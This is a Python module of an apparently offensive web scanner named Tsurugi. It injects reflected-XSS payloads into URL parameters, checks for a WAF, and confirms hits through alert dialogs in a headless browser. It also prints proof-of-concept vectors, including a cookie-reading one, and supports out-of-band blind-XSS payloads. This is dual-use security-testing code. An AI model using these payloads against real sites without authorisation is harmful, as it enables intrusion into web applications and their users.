# HikariSystem Tsurugi/modules/xss.py
"""
XSS MODULE - Reflected XSS detection with HEADLESS CONFIRMATION
Uses Playwright to confirm XSS by listening for dialog events
"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import TYPE_CHECKING
from rich.panel import Panel
from core.ui import console, log_info, log_error, log_success, log_warning
from core.logger import save_loot
from core.utils import load_payloads
import os
from pathlib import Path

if TYPE_CHECKING:
    from core.context import TsurugiContext

# XSS Payloads (Reflected)
CANARY = "TSURUGI_XSS_TEST"

XSS_PAYLOADS_RAW = load_payloads("xss.txt", fallback=[
    f"<script>alert('{CANARY}')</script>",
    f"\"><script>alert('{CANARY}')</script>",
    f"<img src=x onerror=alert('{CANARY}')>",
    f"\"><img src=x onerror=alert('{CANARY}')>",
    f"<svg onload=alert('{CANARY}')>",
    f"\"><svg onload=alert('{CANARY}')>"
])
XSS_PAYLOADS = []
if XSS_PAYLOADS_RAW:
    for p in XSS_PAYLOADS_RAW:
        XSS_PAYLOADS.append(p.replace("{{CANARY}}", CANARY).replace("TSURUGI_XSS_TEST", CANARY))

# Confirmation payloads (simpler, designed to trigger dialogs)
CONFIRM_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "'-alert(1)-'",
    "\"-alert(1)-\"",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
]

def generate_static_pocs(payload: str) -> list[str]:
    """Generate manual PoCs based on the successful payload structure."""
    pocs = []
    p = payload.lower()
    
    if "<script" in p:
        pocs.append(f"<script>alert(document.domain)</script>")
        pocs.append(f"<script>confirm(1)</script>")
        pocs.append(f"<script>prompt(1)</script>")
    elif "<img" in p:
        pocs.append(f"<img src=x onerror=alert(1)>")
        pocs.append(f"<img src=x onerror=confirm(document.cookie)>")
    elif "<svg" in p:
        pocs.append(f"<svg/onload=alert(1)>")
        pocs.append(f"<svg/onload=confirm(1)>")
    elif "<iframe" in p:
        pocs.append(f"<iframe src=javascript:alert(1)></iframe>")
        pocs.append(f"<iframe onload=alert(1)></iframe>")
    elif "javascript:" in p:
        pocs.append(f"javascript:alert(1)")
        pocs.append(f"javascript:confirm(1)")
    else:
        # Generic fallbacks
        pocs.append(f'"><script>alert(1)</script>')
        pocs.append(f'" onmouseover="alert(1)" x="')
        
    return pocs

def confirm_xss_headless(url: str, param: str, payloads: list = None) -> dict:
    """
    Confirm XSS by executing payload in real browser and listening for dialog.
    
    Args:
        url: Base URL with parameters
        param: Parameter to inject into
        payloads: List of payloads to try (uses CONFIRM_PAYLOADS if None)
        
    Returns:
        dict with 'confirmed', 'payload', 'screenshot_path' if confirmed
    """
    from playwright.sync_api import sync_playwright
    
    payloads = payloads or CONFIRM_PAYLOADS
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if param not in params:
        return {"confirmed": False, "error": "Parameter not found"}
    
    result = {"confirmed": False, "payload": None, "screenshot_path": None}
    
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(
                ignore_https_errors=True,
                java_script_enabled=True
            )
            page = context.new_page()
            
            # Track if dialog was triggered
            dialog_triggered = False
            dialog_message = None
            
            def handle_dialog(dialog):
                nonlocal dialog_triggered, dialog_message
                dialog_triggered = True
                dialog_message = dialog.message
                try:
                    dialog.dismiss()
                except:
                    pass
            
            page.on("dialog", handle_dialog)
            
            for payload in payloads:
                dialog_triggered = False
                
                # Build URL with payload
                fuzzed_params = params.copy()
                fuzzed_params[param] = [payload]
                query_string = urlencode(fuzzed_params, doseq=True)
                fuzzed_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, query_string, parsed.fragment
                ))
                
                try:
                    # Navigate and wait for potential dialog
                    page.goto(fuzzed_url, timeout=8000, wait_until="domcontentloaded")
                    page.wait_for_timeout(500)  # Brief wait for JS execution
                    
                    if dialog_triggered:
                        # XSS CONFIRMED!
                        log_success(f"[CONFIRMED] Dialog triggered with payload: {payload}")
                        
                        # Take screenshot as evidence
                        screenshot_dir = Path("loot/screenshots")
                        screenshot_dir.mkdir(parents=True, exist_ok=True)
                        screenshot_path = screenshot_dir / f"xss_confirmed_{hash(fuzzed_url) % 10000}.png"
                        
                        try:
                            page.screenshot(path=str(screenshot_path))
                        except:
                            screenshot_path = None
                        
                        result = {
                            "confirmed": True,
                            "payload": payload,
                            "url": fuzzed_url,
                            "dialog_message": dialog_message,
                            "screenshot_path": str(screenshot_path) if screenshot_path else None
                        }
                        break
                        
                except Exception:
                    # Timeout or navigation error - continue to next payload
                    pass
            
            browser.close()
            
    except Exception as e:
        # log_warning(f"Headless confirmation error: {e}")
        pass
    
    return result


def run_xss_scan(ctx: 'TsurugiContext', url: str, confirm: bool = False) -> bool:
    """Run XSS scan with optional headless confirmation."""
    console.print(f"\n[bold red][*] TSURUGI XSS MODULE[/bold red] -> [yellow]{url}[/yellow]")
    
    if confirm:
        console.print("[bold cyan][*] HEADLESS CONFIRMATION ENABLED[/bold cyan] - Zero false positives mode")
    
    requester = ctx.get_requester()
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        log_error("No parameters found to inject.")
        return False

    detected = False
    confirmed_vulns = []
    waf_detected = False
    html_reflects = False
    
    # ═══════════════════════════════════════════════════════════════════════════
    # PHASE 0: WAF Detection + HTML Reflection Check
    # ═══════════════════════════════════════════════════════════════════════════
    first_param = list(params.keys())[0]
    log_info("Checking for WAF and HTML reflection...")
    
    # Test 1: Harmless HTML tag (should return 200 if no WAF)
    harmless_tag = "<b>TSURUGI_PROBE</b>"
    fuzzed_params = params.copy()
    fuzzed_params[first_param] = [harmless_tag]
    query_string = urlencode(fuzzed_params, doseq=True)
    probe_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query_string, parsed.fragment))
    
    probe_resp = requester.get(probe_url, timeout=10)
    if probe_resp:
        if probe_resp.status_code in [403, 406, 429]:
            waf_detected = True
            console.print("[yellow][!] WAF/Filter detected (403 on harmless tag)[/yellow]")
        elif "TSURUGI_PROBE" in probe_resp.text:
            # Check if HTML rendered or escaped
            if "<b>TSURUGI_PROBE</b>" in probe_resp.text:
                html_reflects = True
                console.print("[yellow][!] HTML tags reflect without encoding![/yellow]")
            elif "&lt;b&gt;" in probe_resp.text or "\\u003c" in probe_resp.text:
                console.print("[dim]HTML is escaped (safe)[/dim]")
    
    # Test 2: Malicious-looking tag (detect WAF blocking)
    if not waf_detected:
        attack_tag = "<script>x</script>"
        fuzzed_params[first_param] = [attack_tag]
        query_string = urlencode(fuzzed_params, doseq=True)
        attack_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query_string, parsed.fragment))
        
        attack_resp = requester.get(attack_url, timeout=10)
        if attack_resp:
            if attack_resp.status_code in [403, 406, 429, 500]:
                waf_detected = True
                console.print(f"[yellow][!] WAF/Filter detected ({attack_resp.status_code} on script tag)[/yellow]")
    
    # Report potential vulnerability if HTML reflects but WAF blocks attacks
    if html_reflects and waf_detected:
        console.print(Panel(
            f"Parameter: {first_param}\nHTML reflects but attack payloads are blocked.\nThe backend code is VULNERABLE but protected by WAF.",
            title="[bold yellow]⚠ POTENTIAL XSS (WAF PROTECTED)[/bold yellow]",
            border_style="yellow"
        ))
        save_loot("xss_potential_waf", url, {
            "param": first_param,
            "html_reflects": True,
            "waf_detected": True,
            "note": "Code is vulnerable but WAF blocks attack payloads"
        })
    
    # Merge OOB Payloads if available
    current_payloads = XSS_PAYLOADS.copy()
    
    # FIX: Use ctx.oob_client instead of oob_client
    if ctx.oob_client and ctx.oob_client.registered:
        console.print(f"[blue][*] OOB Mode Enabled: Using domain {ctx.oob_client.domain}[/blue]")
        oob_payloads = ctx.oob_client.get_payloads()
        current_payloads.extend(oob_payloads)

    for param in params.keys():
        console.print(f"Testing parameter: [bold cyan]{param}[/bold cyan]")

        for payload in current_payloads:
            # Construct Fuzzed URL
            fuzzed_params = params.copy()
            fuzzed_params[param] = [payload]
            query_string = urlencode(fuzzed_params, doseq=True)
            fuzzed_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query_string, parsed.fragment))

            try:
                # 1. Reflected Check
                resp = requester.get(fuzzed_url, timeout=5)
                
                if resp:
                    reflection_found = False
                    if CANARY in resp.text:
                        reflection_found = True
                        # Check if encoded (safe)
                        if "&lt;script&gt;" in resp.text and "<script>" not in resp.text:
                            console.print(f"  [dim]Payload reflected but encoded (Safe): {payload[:30]}...[/dim]")
                            reflection_found = False

                    if reflection_found:
                        console.print(Panel(
                            f"Payload: {payload}\nURL: {fuzzed_url[:80]}...",
                            title=f"[!] REFLECTED XSS DETECTED ({param})",
                            border_style="yellow"
                        ))
                        
                        # Static PoC Suggestion
                        pocs = generate_static_pocs(payload)
                        if pocs:
                            console.print(Panel(
                                "\n".join(pocs),
                                title="[bold green]Manual Verification PoCs[/bold green]",
                                subtitle="Standard vectors for confirmation",
                                border_style="green"
                            ))
                        
                        # If confirm mode, verify in browser
                        if confirm:
                            console.print("[*] Confirming in headless browser...")
                            confirm_result = confirm_xss_headless(url, param)
                            
                            if confirm_result["confirmed"]:
                                console.print(Panel(
                                    f"Payload: {confirm_result['payload']}\n"
                                    f"Dialog: {confirm_result.get('dialog_message', 'alert/confirm/prompt')}\n"
                                    f"Screenshot: {confirm_result.get('screenshot_path', 'N/A')}",
                                    title=f"[!] XSS CONFIRMED IN BROWSER ({param})",
                                    border_style="red"
                                ))
                                detected = True
                                confirmed_vulns.append({
                                    "param": param,
                                    "payload": confirm_result["payload"],
                                    "url": confirm_result["url"],
                                    "screenshot": confirm_result.get("screenshot_path")
                                })
                                save_loot("xss_confirmed", fuzzed_url, {
                                    "payload": confirm_result["payload"],
                                    "confirmed": True,
                                    "dialog_message": confirm_result.get("dialog_message"),
                                    "screenshot": confirm_result.get("screenshot_path")
                                })
                            else:
                                console.print("[dim]Reflection found but dialog didn't trigger (might be filtered)[/dim]")
                                # Still save as potential
                                save_loot("xss_potential", fuzzed_url, {
                                    "payload": payload,
                                    "confirmed": False,
                                    "note": "Reflected but not confirmed in browser"
                                })
                        else:
                            # No confirmation mode - save as detected
                            detected = True
                            save_loot("xss", fuzzed_url, {"payload": payload, "canary": CANARY})
                            console.print("  [bold yellow]Use --confirm to verify in browser![/bold yellow]")
                        
                        break
                
                # 2. OOB Check (Blind) - FIX: Use ctx.oob_client
                if ctx.oob_client and ctx.oob_client.registered:
                    if ctx.oob_client.domain in payload:
                        interactions = ctx.oob_client.poll()
                        if interactions:
                            console.print(Panel(
                                f"Payload: {payload}\nInteraction: {interactions}",
                                title=f"[!] BLIND XSS (OOB) CONFIRMED ({param})",
                                border_style="red"
                            ))
                            detected = True
                            save_loot("xss_blind", fuzzed_url, {"payload": payload, "interactions": interactions})
                            break

            except Exception as e:
                # log_warning(f"Request error: {e}")
                pass
            
            if detected and not confirm: break
        if detected and not confirm: break

    # Summary
    if confirm and confirmed_vulns:
        console.print(f"\n[bold green]✓ {len(confirmed_vulns)} XSS vulnerabilities CONFIRMED in browser[/bold green]")
        for vuln in confirmed_vulns:
            console.print(f"  - {vuln['param']}: {vuln['payload'][:40]}")
    elif not detected:
        console.print("\n[dim]No obvious Reflected XSS found.[/dim]")
        # FIX: Use ctx.oob_client
        if ctx.oob_client:
            console.print("[dim]OOB payloads sent. Check Interactsh later if delayed.[/dim]")
    
    return detected